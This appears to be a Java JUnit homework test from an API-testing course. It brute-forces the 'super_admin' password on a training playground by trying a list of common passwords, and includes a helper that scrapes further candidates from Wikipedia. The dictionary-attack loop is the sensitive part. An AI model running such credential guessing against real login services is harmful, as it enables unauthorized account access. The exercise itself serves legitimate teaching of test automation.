import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.apache.commons.lang3.StringUtils;
import org.junit.jupiter.api.Test;

import java.util.*;

public class findPassEx9 {

    @Test
    public void findPass(){

        String login="super_admin";
        String checkPhrase="You are NOT authorized";

        String urlGetCookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String urlCheckAuth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

        String test_pass="super_admin";

        List<String> testPass = new ArrayList<>();
        //testPass = fullTestPassList();
        testPass = fullTestPassListText();

        if (testPass.isEmpty()) {System.out.println("Списка паролей нет, тест прекращен"); return;}

        for (int i = 0; i < testPass.size(); i++) {
            Map<String, String> data = new HashMap<>();
            data.put("login", login);
            data.put("password", testPass.get(i));

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post(urlGetCookie)
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");
            if (responseCookie == null) {
                System.out.println("Нет такого Логина, пробуйте другой.");
                return;
            }

            Response responseA = RestAssured
                    .given()
                    .body(data)
                    .cookie(responseCookie)
                    .post(urlCheckAuth)
                    .andReturn();

            if ( !responseA.asString().equals(checkPhrase)) {
                System.out.println("Корректное сочетание: " + data);
                responseA.print();
                return;
            } else {
                //System.out.println("Некорректные значения: " + data);
            }
        }

    }

    public List<String> fullTestPassListText(){
        List<String> testPasws = new ArrayList<>();
        testPasws.add("password");
        testPasws.add("123456");
        testPasws.add("12345678");
        testPasws.add("qwerty");
        testPasws.add("abc123");
        testPasws.add("monkey");
        testPasws.add("1234567");
        testPasws.add("letmein");
        testPasws.add("trustno1");
        testPasws.add("dragon");
        testPasws.add("baseball");
        testPasws.add("111111");
        testPasws.add("iloveyou");
        testPasws.add("master");
        testPasws.add("sunshine");
        testPasws.add("ashley");
        testPasws.add("bailey");
        testPasws.add("passw0rd");
        testPasws.add("shadow");
        testPasws.add("123123");
        testPasws.add("654321");
        testPasws.add("superman");
        testPasws.add("qazwsx");
        testPasws.add("michael");
        testPasws.add("Football");
        testPasws.add("password");
        testPasws.add("123456789");
        testPasws.add("12345");
        testPasws.add("princess");
        testPasws.add("admin");
        testPasws.add("welcome");
        testPasws.add("666666");
        testPasws.add("!@#$%^&*");
        testPasws.add("charlie");
        testPasws.add("aa123456");
        testPasws.add("donald");
        testPasws.add("password1");
        testPasws.add("qwerty123");
        testPasws.add("1q2w3e4r");
        testPasws.add("qwertyuiop");
        testPasws.add("555555");
        testPasws.add("lovely");
        testPasws.add("7777777");
        testPasws.add("888888");
        testPasws.add("123qwe");
        testPasws.add("jesus");
        testPasws.add("ninja");
        testPasws.add("mustang");
        testPasws.add("adobe123");
        testPasws.add("1234567890");
        testPasws.add("photoshop");
        testPasws.add("1234");
        testPasws.add("azerty");
        testPasws.add("0000000");
        testPasws.add("access");
        testPasws.add("696969");
        testPasws.add("batman");
        testPasws.add("1qaz2wsx");
        testPasws.add("login");
        testPasws.add("solo");
        testPasws.add("starwars");
        testPasws.add("121212");
        testPasws.add("flower");
        testPasws.add("hottie");
        testPasws.add("loveme");
        testPasws.add("zaq1zaq1");
        testPasws.add("hello");
        testPasws.add("freedom");
        testPasws.add("whatever");
        return testPasws;
    }

    public List<String> fullTestPassList(){

        List<String> testPasws = new ArrayList<>();

        String text1 = "Top 25 most common passwords by year according to SplashData";
        String text2 = "</table>";
        String tag1="<td align=\"left\">";
        String tag2 ="</td>";

        int s1, s2;

        Response responseA = RestAssured
                .post("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
                .andReturn();

        String text = responseA.asString();
        int count = StringUtils.countMatches(text, tag1);
        for (int i = 0; i < count; i++) {
            s1 = text.indexOf(tag1);
            if (s1 > 0) {
                s2 = text.indexOf(tag2, s1);
                String Pass = text.substring(s1 + tag1.length(), s2-1);
                testPasws.add(Pass);
                text = text.substring(s2);
            }
        }
        Set<String> setUnicPswrd = new LinkedHashSet<>(testPasws);
        testPasws = new ArrayList<>(setUnicPswrd);

        System.out.println(testPasws);
        return testPasws;

    }
}
